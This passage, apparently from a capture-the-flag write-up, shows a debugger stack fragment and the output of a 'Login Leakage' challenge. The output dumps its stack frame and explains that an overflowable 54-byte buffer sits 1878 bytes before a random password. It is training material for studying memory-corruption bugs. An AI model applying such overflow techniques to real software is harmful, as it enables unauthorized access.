03:0018│-030 0x7fff21d934a0 —▸ 0x7fff21d935c8 —▸ 0x7fff21d94678 ◂— 0
04:0020│-028 0x7fff21d934a8 ◂— 0x1118237e0
05:0028│-020 0x7fff21d934b0 ◂— 0
06:0030│-018 0x7fff21d934b8 ◂— 0x271011823200
07:0038│-010 0x7fff21d934c0 —▸ 0x7fff21d935d0 ◂— 0
```

&nbsp;

## Login Leakage (Easy)

```
hacker@program-security~login-leakage-easy:/$ /challenge/login-leakage-easy 
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe0cc8fa10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa18 (rsp+0x0008) | e8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912e8 |
| 0x00007ffe0cc8fa20 (rsp+0x0010) | d8 12 c9 0c fe 7f 00 00 | 0x00007ffe0cc912d8 |
| 0x00007ffe0cc8fa28 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe0cc8fa30 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa38 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa40 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa48 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa50 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa58 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa60 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa68 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa70 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa78 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa80 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa88 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa90 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fa98 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faa0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faa8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fab0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fab8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fac0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fac8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fad0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fad8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fae0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fae8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faf0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8faf8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb00 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb08 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb10 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb18 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb20 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb28 (rsp+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb30 (rsp+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb38 (rsp+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb40 (rsp+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb48 (rsp+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb50 (rsp+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb58 (rsp+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb60 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb68 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb70 (rsp+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb78 (rsp+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb80 (rsp+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb88 (rsp+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb90 (rsp+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fb98 (rsp+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fba0 (rsp+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fba8 (rsp+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbb0 (rsp+0x01a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbb8 (rsp+0x01a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbc0 (rsp+0x01b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbc8 (rsp+0x01b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbd0 (rsp+0x01c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbd8 (rsp+0x01c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbe0 (rsp+0x01d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbe8 (rsp+0x01d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbf0 (rsp+0x01e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fbf8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc00 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc08 (rsp+0x01f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc10 (rsp+0x0200) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc18 (rsp+0x0208) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc20 (rsp+0x0210) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc28 (rsp+0x0218) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc30 (rsp+0x0220) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc38 (rsp+0x0228) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc40 (rsp+0x0230) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc48 (rsp+0x0238) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc50 (rsp+0x0240) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc58 (rsp+0x0248) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc60 (rsp+0x0250) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc68 (rsp+0x0258) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc70 (rsp+0x0260) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc78 (rsp+0x0268) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc80 (rsp+0x0270) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc88 (rsp+0x0278) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc90 (rsp+0x0280) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fc98 (rsp+0x0288) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fca0 (rsp+0x0290) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fca8 (rsp+0x0298) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcb0 (rsp+0x02a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcb8 (rsp+0x02a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcc0 (rsp+0x02b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcc8 (rsp+0x02b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcd0 (rsp+0x02c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcd8 (rsp+0x02c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fce0 (rsp+0x02d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fce8 (rsp+0x02d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcf0 (rsp+0x02e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fcf8 (rsp+0x02e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd00 (rsp+0x02f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd08 (rsp+0x02f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd10 (rsp+0x0300) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd18 (rsp+0x0308) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd20 (rsp+0x0310) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd28 (rsp+0x0318) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd30 (rsp+0x0320) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd38 (rsp+0x0328) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd40 (rsp+0x0330) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd48 (rsp+0x0338) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd50 (rsp+0x0340) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd58 (rsp+0x0348) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd60 (rsp+0x0350) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd68 (rsp+0x0358) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd70 (rsp+0x0360) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd78 (rsp+0x0368) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd80 (rsp+0x0370) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd88 (rsp+0x0378) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd90 (rsp+0x0380) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd98 (rsp+0x0388) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fda0 (rsp+0x0390) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fda8 (rsp+0x0398) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdb0 (rsp+0x03a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdb8 (rsp+0x03a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdc0 (rsp+0x03b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdc8 (rsp+0x03b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdd0 (rsp+0x03c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdd8 (rsp+0x03c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fde0 (rsp+0x03d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fde8 (rsp+0x03d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdf0 (rsp+0x03e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdf8 (rsp+0x03e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe00 (rsp+0x03f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe08 (rsp+0x03f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe10 (rsp+0x0400) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe18 (rsp+0x0408) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe20 (rsp+0x0410) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe28 (rsp+0x0418) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe30 (rsp+0x0420) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe38 (rsp+0x0428) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe40 (rsp+0x0430) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe48 (rsp+0x0438) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe50 (rsp+0x0440) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe58 (rsp+0x0448) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe60 (rsp+0x0450) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe68 (rsp+0x0458) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe70 (rsp+0x0460) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe78 (rsp+0x0468) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe80 (rsp+0x0470) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe88 (rsp+0x0478) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe90 (rsp+0x0480) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe98 (rsp+0x0488) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fea0 (rsp+0x0490) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fea8 (rsp+0x0498) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8feb0 (rsp+0x04a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8feb8 (rsp+0x04a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fec0 (rsp+0x04b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fec8 (rsp+0x04b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fed0 (rsp+0x04c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fed8 (rsp+0x04c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fee0 (rsp+0x04d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fee8 (rsp+0x04d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fef0 (rsp+0x04e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fef8 (rsp+0x04e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff00 (rsp+0x04f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff08 (rsp+0x04f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff10 (rsp+0x0500) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff18 (rsp+0x0508) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff20 (rsp+0x0510) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff28 (rsp+0x0518) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff30 (rsp+0x0520) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff38 (rsp+0x0528) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff40 (rsp+0x0530) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff48 (rsp+0x0538) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff50 (rsp+0x0540) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff58 (rsp+0x0548) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff60 (rsp+0x0550) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff68 (rsp+0x0558) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff70 (rsp+0x0560) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff78 (rsp+0x0568) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff80 (rsp+0x0570) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff88 (rsp+0x0578) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff90 (rsp+0x0580) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff98 (rsp+0x0588) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffa0 (rsp+0x0590) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffa8 (rsp+0x0598) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffb0 (rsp+0x05a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffb8 (rsp+0x05a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffc0 (rsp+0x05b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffc8 (rsp+0x05b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffd0 (rsp+0x05c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffd8 (rsp+0x05c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffe0 (rsp+0x05d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffe8 (rsp+0x05d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fff0 (rsp+0x05e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fff8 (rsp+0x05e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90000 (rsp+0x05f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90008 (rsp+0x05f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90010 (rsp+0x0600) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90018 (rsp+0x0608) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90020 (rsp+0x0610) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90028 (rsp+0x0618) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90030 (rsp+0x0620) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90038 (rsp+0x0628) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90040 (rsp+0x0630) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90048 (rsp+0x0638) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90050 (rsp+0x0640) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90058 (rsp+0x0648) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90060 (rsp+0x0650) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90068 (rsp+0x0658) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90070 (rsp+0x0660) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90078 (rsp+0x0668) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90080 (rsp+0x0670) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90088 (rsp+0x0678) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90090 (rsp+0x0680) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90098 (rsp+0x0688) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900a0 (rsp+0x0690) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900a8 (rsp+0x0698) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900b0 (rsp+0x06a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900b8 (rsp+0x06a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900c0 (rsp+0x06b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900c8 (rsp+0x06b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900d0 (rsp+0x06c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900d8 (rsp+0x06c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900e0 (rsp+0x06d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900e8 (rsp+0x06d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900f0 (rsp+0x06e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900f8 (rsp+0x06e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90100 (rsp+0x06f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90108 (rsp+0x06f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90110 (rsp+0x0700) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90118 (rsp+0x0708) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90120 (rsp+0x0710) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90128 (rsp+0x0718) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90130 (rsp+0x0720) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90138 (rsp+0x0728) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90140 (rsp+0x0730) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90148 (rsp+0x0738) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90150 (rsp+0x0740) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90158 (rsp+0x0748) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90160 (rsp+0x0750) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90168 (rsp+0x0758) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90170 (rsp+0x0760) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90178 (rsp+0x0768) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90180 (rsp+0x0770) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90188 (rsp+0x0778) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90190 (rsp+0x0780) | 00 00 00 00 00 00 d9 18 | 0x18d9000000000000 |
| 0x00007ffe0cc90198 (rsp+0x0788) | f3 27 ee 25 5f 78 00 00 | 0x0000785f25ee27f3 |
| 0x00007ffe0cc901a0 (rsp+0x0790) | 00 d2 e7 9b cf 5c 00 00 | 0x00005ccf9be7d200 |
| 0x00007ffe0cc901a8 (rsp+0x0798) | d0 12 c9 0c 03 00 00 00 | 0x000000030cc912d0 |
| 0x00007ffe0cc901b0 (rsp+0x07a0) | e0 11 c9 0c fe 7f 00 00 | 0x00007ffe0cc911e0 |
| 0x00007ffe0cc901b8 (rsp+0x07a8) | 1e e2 e7 9b cf 5c 00 00 | 0x00005ccf9be7e21e |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe0cc8fa10, and our base pointer points to 0x7ffe0cc901b0.
This means that we have (decimal) 246 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 1968 bytes.
The input buffer begins at 0x7ffe0cc8fa40, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 54 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge is a password checker that will check your input against a randomly generated password.
The password is stored at 0x7ffe0cc90196, 1878 bytes after the start of your input buffer.
